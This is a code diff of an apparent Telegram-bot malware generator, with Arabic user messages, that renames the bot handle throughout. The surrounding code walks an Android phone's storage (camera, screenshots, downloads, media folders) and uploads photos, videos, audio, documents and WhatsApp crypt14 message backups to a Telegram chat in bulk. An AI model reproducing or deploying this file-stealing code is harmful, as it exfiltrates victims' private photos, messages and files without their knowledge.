@@ -132,7 +132,7 @@ def refrral(message):
             referral_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
             cursor.execute('UPDATE user SET refrralcode = ? WHERE user_id = ?', (referral_code, id))
             conn.commit()
-            bot_username = "atmaja_pro_bot"
+            bot_username = "Atmaja5788_bot"
             reff = f'https://t.me/{bot_username}?start={referral_code}'
             bot.send_message(chat_id=message.chat.id, text=f'''
 تم توليد كود إحالة خاص بك، أرسله لأصدقائك وأي شخص يدخل للبوت عن طريق هذا الرابط سيتم إضافة نقطتين إلى حسابك 🤩
@@ -141,7 +141,7 @@ def refrral(message):
 {reff}
 ''')
         else:
-            bot_username = "atmaja_pro_bot"
+            bot_username = "Atmaja5788_bot"
             refff = f'https://t.me/{bot_username}?start={ref}'
             bot.send_message(chat_id=message.chat.id, text=f'''
 لديك رابط إحالة بالفعل:
@@ -404,7 +404,7 @@ dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 def background():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -498,22 +498,22 @@ dir_path = "/storage/emulated/0/Android/media/"
 def send_voice(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".opus",".mp3", ".aac")):
-            bot.send_audio(chat_id={id}, audio=f, caption='By: @atmaja_pro_bot')
+            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')
 
 def send_phot(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 def send_video(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
 
 def send_doc(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
-            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -612,7 +612,7 @@ dir_path = "/storage/emulated/0/DCIM/Camera/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 def background():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -704,7 +704,7 @@ dir_path = "/storage/emulated/0/DCIM/Screenshots/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 def background():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -797,7 +797,7 @@ dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
-            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -890,7 +890,7 @@ dir_path = "/storage/emulated/0/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -984,18 +984,18 @@ dir_path = "/storage/emulated/0/Download/"
 def send_file1(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 
 def send_file2(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
 
 def send_file3(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".pdf", ".pat", ".doc", ".py", ".apk", ".exe", ".cpp", ".text")):
-            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1094,7 +1094,7 @@ dir_path = "/storage/emulated/0/Android/media/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".aac",".mp3", ".opus")):
-            bot.send_audio(chat_id={id}, audio=f, caption='By: @atmaja_pro_bot')
+            bot.send_audio(chat_id={id}, audio=f, caption='By: @Atmaja5788_bot')
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
 		for root, dirs, files in os.walk(dir_path):
@@ -1188,7 +1188,7 @@ dir_path = "/storage/emulated/0/Android/media/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
 
 def back():
 	with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1284,7 +1284,7 @@ dir_path = "/storage/emulated/0/Android/media/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".png", ".PNG", ".jpg", ".JPG", ".jpeg", ".JPEG", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 def back():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1380,7 +1380,7 @@ dir_path = "/storage/emulated/0/Android/media/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith("crypt14"):
-            bot.send_document(chat_id={id}, document=f, caption='By: @atmaja_pro_bot')
+            bot.send_document(chat_id={id}, document=f, caption='By: @Atmaja5788_bot')
 
 def bqck():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1475,7 +1475,7 @@ dir_path = "/storage/emulated/0/DCIM/Camera/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".mp4")):
-            bot.send_video(chat_id={id}, video=f, caption='By: @atmaja_pro_bot')
+            bot.send_video(chat_id={id}, video=f, caption='By: @Atmaja5788_bot')
 
 def back():
     with ThreadPoolExecutor(max_workers=300) as executor:
@@ -1569,7 +1569,7 @@ dir_path = "/storage/emulated/0/DCIM/Camera/"
 def send_file(file_path):
     with open(file_path, "rb") as f:
         if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
-            bot.send_photo(chat_id={id}, photo=f, caption='By: @atmaja_pro_bot')
+            bot.send_photo(chat_id={id}, photo=f, caption='By: @Atmaja5788_bot')
 
 def back():
     with ThreadPoolExecutor(max_workers=300) as executor:
